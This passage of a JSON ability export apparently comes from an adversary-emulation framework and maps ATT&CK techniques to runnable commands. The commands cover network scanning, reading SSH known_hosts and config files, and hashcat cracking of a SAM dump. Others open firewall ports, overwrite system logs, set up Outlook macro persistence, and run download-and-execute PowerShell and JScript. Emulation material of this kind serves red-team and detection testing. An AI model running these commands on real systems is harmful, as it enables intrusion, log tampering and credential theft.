                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "sudo ifconfig",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "sudo ifconfig",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ipconfig",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "View network configuration info for host",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Network Interface Configuration",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "5a4cb2be-2684-4801-9355-3a90c91e0004",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Network Service Scanning",
        "technique_id": "T1046",
        "executors": [
            {
                "timeout": 180,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Import-Module ./basic_scanner.ps1;\n$ports = @(22, 53, 80, 445);\nGet-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \"Disconnected\"} | Get-NetIPaddress -AddressFamily IPv4 | %{\n    $ipv4 = $_.IPAddress;\n    $prefixLength = $_.PrefixLength;\n    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;\n};",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "basic_scanner.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Scans the local network for common open ports",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Network Service Scanning",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "31c494c440a6182ee3433f9f91ba3761",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "technique_id": "T1083",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm /tmp/T1083.txt"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ls -a >> /tmp/T1083.txt; if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi; file */* *>> /tmp/T1083.txt; cat /tmp/T1083.txt 2>/dev/null; find . -type f; ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'; locate *; which sh",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "rm /tmp/T1083.txt"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ls -a >> /tmp/T1083.txt; if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi; file */* *>> /tmp/T1083.txt; cat /tmp/T1083.txt 2>/dev/null; find . -type f; ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'; locate *; which sh",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Nix File and Directory Discovery",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "7cdca4b040c7f1578c3dd53fb781356f",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "technique_id": "T1083",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm /tmp/T1083.txt"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt; if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; find . -type f -iname *.pdf >> /tmp/T1083.txt; cat /tmp/T1083.txt; find . -type f -name \".*\"",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "rm /tmp/T1083.txt"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt; if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; find . -type f -iname *.pdf >> /tmp/T1083.txt; cat /tmp/T1083.txt; find . -type f -name \".*\"",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find or discover files on the file system\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Nix File and Directory Discovery 2",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "591f5d57f5d87e3e0202fc46375c780d",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "technique_id": "T1204.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript C:\\Users\\Public\\art.jse`\", vbNormalFocus)`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "OSTAP JS version",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "522f3f35cd013e63830fa555495a0081",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "technique_id": "T1204.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "del %TEMP%\\OSTapGet.js /F /Q >nul 2>&1"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo var url = \"https://128.30.52.100/TR/PNG/iso_8859-1.txt\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\\OSTapGet.js && cscript //E:Jscript %TEMP%\\OSTapGet.js",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Uses cscript //E:jscript to download a file\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "OSTap Payload Download",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "a40a2e93cc2a0413982801a9323baad9",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "technique_id": "T1204.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item C:\\Users\\Public\\art.jse -ErrorAction Ignore"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe C:\\Users\\Public\\art.jse`\"`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "OSTap Style Macro Execution",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "12ad9edefc86af07700fbf49bfdac6ba",
        "buckets": [
            "persistence"
        ],
        "privilege": "",
        "technique_name": "Office Application Startup",
        "technique_id": "T1137",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /f >nul 2>&1 && del %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM >nul 2>&1"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /t REG_DWORD /d 1 /f && mkdir  %APPDATA%\\Microsoft\\Outlook\\ >nul 2>&1 && echo \"Atomic Red Team TEST\" > %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ \nit is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.\nToo achieve this two things must happened on the syste\n- The macro security registry value must be set to '4'\n- A file called VbaProject.OTM must be created in the Outlook Folder.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Office Application Startup - Outlook as a C2",
        "tactic": "persistence",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3ee7020bd7459eab27bae7e95e752e25",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "technique_id": "T1204.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item \"C:\\Users\\$env:username\\Desktop\\https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt\" -ErrorAction Ignore"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macroCode = Get-Content \"#{macro_path}\" -Raw; $URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"; $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"; Invoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\"",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Office Generic Payload Download",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "d6f57d813245d0ec3940cb3c50ad2848",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "technique_id": "T1204.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"$(\"$env:temp\\art1204.bat\")`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c $bat_path `\", vbNormalFocus)`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct Word",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Office launching .bat file from AppData",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "8d0a4585e7c4646185a912b14cd9cb46",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "netsh advfirewall firewall delete rule name=\"Open Port to Any\" | Out-Null"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=3389 action=allow profile=any",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test will attempt to open a local port defined by input arguments to any profile",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Open a local port through Windows Firewall to any profile",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "bd5ee87126c38b409c12f823ec4469c2",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "netsh advfirewall firewall delete rule name=\"atomic testing\" protocol=TCP localport=450 >nul 2>&1"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow dir=in protocol=TCP localport=450",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.\n\nreference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Opening ports for proxy - HARDRAIN",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "0b08c825efb2cde024483ac979370167",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "technique_id": "T1070.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo 0> /var/log/secure",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Overwrite Linux Log",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "95c55dd6ee44eea93965561082f5fdaa",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "technique_id": "T1070.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo 0> /var/spool/mail/root",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Overwrite Linux Mail Spool",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "50acc12597d14b648556dac8ed7b39a7",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Network Sniffing",
        "technique_id": "T1040",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tcpdump -c 5 -nnni ens33; tshark -c 5 -i ens33",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Packet Capture Linux",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "e648f7d27bb1fd8993e12e5e265da137",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Network Sniffing",
        "technique_id": "T1040",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet -c 5",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface \"Ethernet\".\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Packet Capture Windows Command Prompt",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "faec788ffe6f5aa762747af7d1ac7a74",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Network Sniffing",
        "technique_id": "T1040",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "sudo tcpdump -c 5 -nnni en0A    ; if [ -x \"$(command -v tshark)\" ]; then sudo tshark -c 5 -i en0A; fi;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Packet Capture macOS",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "02de522f-7e0a-4544-8afc-0c195f400f5f",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Data from Local System",
        "technique_id": "T1005",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "pip install stormssh && storm list",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.ssh",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "remote.ssh.cmd",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "pip install -q stormssh 2> /dev/null && storm list | sed 's/\\x1b\\[[0-9;]*m//g'",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.ssh",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "remote.ssh.cmd",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Search for valid SSH commands in the config file",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Parse SSH config",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "5f77ecf9-613f-4863-8d2f-ed6b447a4633",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "technique_id": "T1018",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cat ~/.ssh/known_hosts",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cat ~/.ssh/known_hosts",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "View the known_hosts file",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Parse SSH known_hosts",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "70850854e26426b18a74438dc5d7fbfc",
        "buckets": [
            "credential-access"
        ],
        "privilege": "",
        "technique_name": "Brute Force: Password Cracking",
        "technique_id": "T1110.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "del %temp%\\hashcat6.7z >nul 2>&1 && del %temp%\\7z1900.exe >nul 2>&1 && del %temp%\\7z /Q /S >nul 2>&1 && del %temp%\\hashcat-unzip /Q /S >nul 2>&1"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cd %temp%\\hashcat6\\hashcat-6.1.1\\hashcat.exe\\.. && %temp%\\hashcat6\\hashcat-6.1.1\\hashcat.exe -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule c5068b_sam.txt cab59f_password.lst",
                "name": "cmd",
                "parsers": [],
                "payloads": [
                    "c5068b_sam.txt",
                    "cab59f_password.lst"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Password Cracking with Hashcat",
        "tactic": "credential-access",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "e82f39e2-56f8-4f19-8376-b007f9ac5f8a",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Password Policy Discovery",
        "technique_id": "T1201",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "pwpolicy getaccountpolicies",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cat /etc/pam.d/common-password",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net accounts",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Password Policy Discovery",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Password Policy",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "2946edba-54d8-11eb-ae93-0242ac130002",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Password Policy Discovery for a domain",
        "technique_id": "T1201",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net accounts /domain",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Password Policy Discovery for a domain",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Password Policy for a domain",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "5c4dd985-89e3-4590-9b57-71fed66ff4e2",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Local Groups",
        "technique_id": "T1069.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "gpresult /R",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "groups",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "groups",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Summary of permission and security groups",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Permission Groups Discovery",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "b125e9daeb0034ed25c30b2f232d5e7c",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Event Triggered Execution: Emond",
        "technique_id": "T1546.014",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "sudo rm /etc/emond.d/rules/T1546.014_emond.plist; sudo rm /private/var/db/emondClients/T1546.014"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "sudo cp \"d6d565_T1546.014_emond.plist\" /etc/emond.d/rules/T1546.014_emond.plist; sudo touch /private/var/db/emondClients/T1546.014",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "d6d565_T1546.014_emond.plist"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
